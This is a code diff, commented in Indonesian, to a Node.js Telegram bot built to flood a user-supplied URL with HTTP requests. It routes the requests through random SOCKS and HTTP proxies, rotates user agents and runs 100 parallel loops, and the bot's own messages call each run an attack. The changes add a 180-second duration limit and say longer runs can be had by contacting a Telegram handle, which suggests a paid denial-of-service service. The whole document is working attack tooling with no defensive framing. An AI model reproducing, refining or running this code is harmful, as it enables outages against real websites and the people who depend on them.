@@ -28,7 +28,7 @@ const cplist = ["max-age=0", "no-cache"];
 function readProxy() {
     try {
         const data = fs.readFileSync(proxyF, "utf8");
-        return data.trim().split("\n").map((line) => line.trim());
+        return data.trim().split("\n").map((line) => line.trim()).filter(line => line);
     } catch (error) {
         console.error(`Failed to read proxy list: ${error}`);
         return [];
@@ -38,7 +38,7 @@ function readProxy() {
 function readUA() {
     try {
         const data = fs.readFileSync(uaLF, "utf-8").replace(/\r/g, "").split("\n");
-        return data.map((line) => line.trim());
+        return data.map(line => line.trim()).filter(line => line);
     } catch (error) {
         console.error(`Failed to read user agent list: ${error}`);
         return [];
@@ -69,10 +69,9 @@ function sendReq(target, agent, userAgent, chatId) {
     };
 
     axios
-        .get(target, { httpAgent: agent, headers: headers, timeout: 5000 }) // Tambah timeout untuk stabilitas
-        .then((_) => {
-            bot.sendMessage(chatId, "Permintaan berhasil dikirim!");
-            setTimeout(() => sendReq(target, agent, userAgent, chatId), 0);
+        .get(target, { httpAgent: agent, headers: headers, timeout: 5000 })
+        .then(() => {
+            bot.sendMessage(chatId, `Permintaan berhasil dikirim ke ${target}!`);
         })
         .catch((error) => {
             if (error.response && error.response.status === 503) {
@@ -82,7 +81,6 @@ function sendReq(target, agent, userAgent, chatId) {
             } else {
                 bot.sendMessage(chatId, `Error: ${error.message}`);
             }
-            setTimeout(() => sendReq(target, agent, userAgent, chatId), 0);
         });
 }
 
@@ -90,30 +88,51 @@ function sendReqs(targetUrl, chatId) {
     const proxies = readProxy();
     const userAgentsList = readUA();
 
-    if (proxies.length > 0) {
-        const proxy = randElement(proxies);
+    if (!userAgentsList.length) {
+        bot.sendMessage(chatId, `Error: Daftar user-agent kosong atau file ${uaLF} tidak ditemukan!`);
+        return;
+    }
+
+    const proxy = proxies.length ? randElement(proxies) : null;
+    let agent = null;
+
+    if (proxy) {
         const proxyParts = proxy.split(":");
+        if (proxyParts.length < 2) {
+            bot.sendMessage(chatId, `Error: Format proxy tidak valid: ${proxy}`);
+            return;
+        }
         const proxyProtocol = proxyParts[0].startsWith("socks") ? "socks5" : "http";
         const proxyUrl = `${proxyProtocol}://${proxyParts[0]}:${proxyParts[1]}`;
-        const agent = proxyProtocol === "socks5"
-            ? new SocksProxyAgent(proxyUrl)
-            : new HttpsProxyAgent(proxyUrl);
-
-        sendReq(targetUrl, agent, randElement(userAgentsList), chatId);
+        agent = proxyProtocol === "socks5" ? new SocksProxyAgent(proxyUrl) : new HttpsProxyAgent(proxyUrl);
+        bot.sendMessage(chatId, `Menggunakan proxy: ${proxyUrl}`);
     } else {
-        sendReq(targetUrl, null, randElement(userAgentsList), chatId);
+        bot.sendMessage(chatId, "Tidak ada proxy, mengirim permintaan tanpa proxy");
     }
+
+    sendReq(targetUrl, agent, randElement(userAgentsList), chatId);
 }
 
 // Telegram bot commands
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
-    bot.sendMessage(chatId, "Selamat datang di bot! Gunakan /mulai <URL> untuk memulai serangan (contoh: /mulai https://example.com).");
+    bot.sendMessage(chatId, "Selamat datang di bot! Gunakan /mulai <URL> <durasi> untuk memulai serangan (contoh: /mulai https://example.com 100). Durasi maksimal 180 detik.");
 });
 
-bot.onText(/\/mulai\s+(.+)/, (msg, match) => {
+bot.onText(/\/mulai\s+([^\s]+)\s+(\d+)/, (msg, match) => {
     const chatId = msg.chat.id;
     let url = match[1].trim();
+    const duration = parseInt(match[2]); // Durasi dalam detik
+
+    // Validasi durasi
+    if (duration > 180) {
+        bot.sendMessage(chatId, "Durasi maksimal adalah 180 detik. Untuk memperpanjang, hubungi @@RajaGtpsS.");
+        return;
+    }
+    if (duration <= 0) {
+        bot.sendMessage(chatId, "Durasi harus lebih dari 0 detik.");
+        return;
+    }
 
     // Tambahkan protokol jika tidak ada
     if (!url.startsWith("http://") && !url.startsWith("https://")) {
@@ -124,41 +143,23 @@ bot.onText(/\/mulai\s+(.+)/, (msg, match) => {
     try {
         new URL(url);
     } catch (error) {
-        bot.sendMessage(chatId, "URL tidak valid. Gunakan format seperti /mulai https://example.com");
+        bot.sendMessage(chatId, "URL tidak valid. Gunakan format seperti /mulai https://example.com 100");
         return;
     }
 
-    bot.sendMessage(chatId, "🚀 Memulai serangan... 🤣");
+    bot.sendMessage(chatId, `🚀 Memulai serangan ke ${url} selama ${duration} detik... 🤣`);
+
     let continueAttack = true;
-    const maxRequests = 100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000; // Batas realistis
-    const requestsPerSecond = 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000; // Batas kecepatan
+    const requestsPerSecond = 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000; // Dari kode asli
+    const maxRequests = duration * requestsPerSecond; // Hitung berdasarkan durasi
+
+    let requestCount = 0;
 
     const attack = () => {
-        try {
-            if (!continueAttack) return;
-
-            const userAgent = randElement(userAgents);
-            const headers = {
-                'User-Agent': userAgent
-            };
-
-            axios.get(url, { headers })
-                .then((response) => {
-                    if (response.status === 503) {
-                        bot.sendMessage(chatId, "Server merespons 503, melanjutkan...");
-                    }
-                })
-                .catch((error) => {
-                    if (error.response && error.response.status === 502) {
-                        bot.sendMessage(chatId, "Error: Permintaan gagal dengan status 502");
-                    }
-                });
-
-            setTimeout(attack, 1000 / requestsPerSecond);
-        } catch (error) {
-            bot.sendMessage(chatId, `Error: ${error.message}`);
-            setTimeout(attack, 1000 / requestsPerSecond);
-        }
+        if (!continueAttack || requestCount >= maxRequests) return;
+        requestCount++;
+        sendReqs(url, chatId);
+        setTimeout(attack, 1000 / requestsPerSecond);
     };
 
     const numThreads = 100; // Kurangi untuk stabilitas
@@ -168,8 +169,8 @@ bot.onText(/\/mulai\s+(.+)/, (msg, match) => {
 
     setTimeout(() => {
         continueAttack = false;
-        bot.sendMessage(chatId, "Batas maksimum permintaan tercapai. Serangan dihentikan.");
-    }, maxRequests / requestsPerSecond * 1000);
+        bot.sendMessage(chatId, "Batas waktu serangan tercapai. Serangan dihentikan.");
+    }, duration * 1000); // Durasi dalam milidetik
 });
 
 // Display startup message
